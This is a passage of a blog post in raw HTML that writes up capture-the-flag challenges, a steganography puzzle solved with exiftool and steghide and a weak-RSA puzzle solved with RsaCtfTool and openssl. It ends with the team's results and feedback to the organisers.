1em;"><img border="0" data-original-height="589" data-original-width="600" height="314" src="https://1.bp.blogspot.com/-HNnzY-bJ53g/XVELR8RHyNI/AAAAAAAAA_U/UidmpwGGb54SKKw8a0NFk_j13QH3p-W1ACEwYBhgL/s320/ctf1_cdd4d5438229ba242947d4803ec99687.jpg" width="320" /></a></div><br />Pretty basic steganography challenge. Exiftool reveals a steghide password:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-UUiBzQc0QLI/XVEIkKUAMWI/AAAAAAAAA-o/w8Vpg2Sfe844LKUc-E6IfsivLxKBh9iTACEwYBhgL/s1600/thailand_exif.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="327" data-original-width="789" height="264" src="https://1.bp.blogspot.com/-UUiBzQc0QLI/XVEIkKUAMWI/AAAAAAAAA-o/w8Vpg2Sfe844LKUc-E6IfsivLxKBh9iTACEwYBhgL/s640/thailand_exif.png" width="640" /></a></div><br />Then using Steghide, we got the 'secrets.txt' file which contained the flag.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-qg62ftfHdEE/XVEIkWHv8XI/AAAAAAAAA-o/sAsOY0-UdIoLzc7IecinDcorqAmj0WYfQCEwYBhgL/s1600/thailand_flag.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="93" data-original-width="897" height="66" src="https://1.bp.blogspot.com/-qg62ftfHdEE/XVEIkWHv8XI/AAAAAAAAA-o/sAsOY0-UdIoLzc7IecinDcorqAmj0WYfQCEwYBhgL/s640/thailand_flag.png" width="640" /></a></div><br /><h3>Romania - 200 points</h3><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-lXbDmEanAR0/XVEIhQFjt6I/AAAAAAAAA-k/8tda1xuwlxISwVRbSR3IYA4G0r1r7tL3wCEwYBhgL/s1600/romania.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="562" data-original-width="642" height="350" src="https://1.bp.blogspot.com/-lXbDmEanAR0/XVEIhQFjt6I/AAAAAAAAA-k/8tda1xuwlxISwVRbSR3IYA4G0r1r7tL3wCEwYBhgL/s400/romania.png" width="400" /></a></div><br />We are given a zip that contains a public.pem and a secrets.zip file which is encrypted. Using the well-known RsaCtfTool (<a href="https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</a>) we were able to retrieve the private key and then decrypt the zip file with 'openssl rsautl'.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-jjsOPJjJRZ4/XVEIiVJgpMI/AAAAAAAAA-s/n_-g26qMlPIlKNQqupqknW6ZI0NU5n4DACPcBGAYYCw/s1600/romania_privatekey.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="290" data-original-width="1177" height="155" src="https://1.bp.blogspot.com/-jjsOPJjJRZ4/XVEIiVJgpMI/AAAAAAAAA-s/n_-g26qMlPIlKNQqupqknW6ZI0NU5n4DACPcBGAYYCw/s640/romania_privatekey.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-bmBkNmuPeaU/XVEIh7mhxZI/AAAAAAAAA-4/IjQRzb9QiCwRtpyib3zJMfsdF9qm6X7AQCPcBGAYYCw/s1600/romania_flag.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="91" data-original-width="1184" height="48" src="https://1.bp.blogspot.com/-bmBkNmuPeaU/XVEIh7mhxZI/AAAAAAAAA-4/IjQRzb9QiCwRtpyib3zJMfsdF9qm6X7AQCPcBGAYYCw/s640/romania_flag.png" width="640" /></a></div><br /><br /><h2>Results</h2><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-VV7KVjP7T7k/XVEIc6ONV1I/AAAAAAAAA-o/eIivkJzq2NwGFCtejeAlKAcdOAp-0GxygCEwYBhgL/s1600/end_board.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="756" data-original-width="862" height="560" src="https://1.bp.blogspot.com/-VV7KVjP7T7k/XVEIc6ONV1I/AAAAAAAAA-o/eIivkJzq2NwGFCtejeAlKAcdOAp-0GxygCEwYBhgL/s640/end_board.png" width="640" /></a></div><div><br /></div><h2>Feedback and Comments</h2><div>The organizers did a great job as always putting on this CTF and we had a lot of fun participating again this year. You could feel their passion and devotion to creating something exciting and challenging based on the boost in challenge difficulty and volume. There are only a couple of tweaks we would recommend for improving CTFs moving forward. First, a couple of the challenges were overly vague in the description, which is understandable to create a challenge, but for certain instances a slight bit more direction as to what we are searching for would have been appreciated (looking at you Spain!). However, this may be elucidated in the official writeup. And lastly, just a bit more communication from the organizers. There were a couple of hiccups at the start where challenges did not have their attachments and teams were hunting for something&nbsp;completely off, and a broadcast on the gameboard or Tweet would have been appreciated. Overall it was super fun and we are looking forward to seeing what's in store next year! Thank you again!</div><div><br /></div><div><br /></div><div><br /></div><div><br /></div><div><br /></div><div><br /></div><div><br /></div><div><br /></div><style type="text/css">p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 14.0px Menlo; color: #000000} span.s1 {font-variant-ligatures: no-common-ligatures} </style>